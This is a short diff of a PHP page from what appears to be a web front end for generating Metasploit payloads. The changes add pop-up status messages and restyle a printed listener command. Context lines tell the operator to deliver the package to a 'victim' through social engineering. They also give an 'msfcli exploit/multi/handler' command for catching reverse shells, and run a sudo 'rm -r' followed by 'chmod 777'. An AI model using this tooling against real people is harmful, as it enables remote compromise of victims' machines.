@@ -111,7 +111,8 @@ require_once 'u.php';
               }
                
  else {
-      
+       echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Generating Payloads, please wait... ! Please refer result section after this message'});</script>";
+           
                    require_once 'loading.php';
                    exec("sudo rm -r exploits/ && sudo mkdir exploits && sudo chmod 777 -R exploits/");  
              
@@ -139,7 +140,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.' LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD='.$c.' LHOST='.$ip.' LPORT='.$port.' E <b></code>'; 
 
 }else {
     echo "Possible file upload attack!\n";
@@ -150,7 +151,9 @@ echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.' LHOST='.$ip.' LPORT='.$po
 print "</pre>";
 $host=$_SERVER['SERVER_ADDR'];
 	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";
- 
+   echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Payload Generated  ! Please refer result section after this message'});</script>";
+     
+
          echo '</div>
                                     <footer>
 				<div align="left">
